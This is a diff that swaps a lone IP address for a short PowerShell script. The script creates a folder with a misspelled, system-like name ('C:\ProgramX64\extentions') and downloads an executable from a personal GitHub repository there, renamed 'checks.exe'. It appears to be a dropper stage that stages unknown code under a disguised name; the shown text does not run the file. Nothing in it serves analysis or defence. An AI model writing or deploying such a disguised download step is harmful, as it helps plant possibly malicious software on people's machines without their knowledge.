@@ -1,1 +1,15 @@
-197.238.130.157
+
+$url = "https://raw.githubusercontent.com/wajih8/wpla_wajih/refs/heads/main/waj.exe"
+$destination = "C:\ProgramX64\extentions\checks.exe"
+
+$directory = Split-Path -Path $destination
+if (-not (Test-Path -Path $directory)) {
+    New-Item -ItemType Directory -Path $directory -Force | Out-Null
+    Write-Host "Created directory: $directory" -ForegroundColor Cyan
+}
+
+# Download the file
+Write-Host "Downloading file to $destination..." -ForegroundColor Yellow
+Invoke-WebRequest -Uri $url -OutFile $destination
+
+Write-Host "Download complete!" -ForegroundColor Green
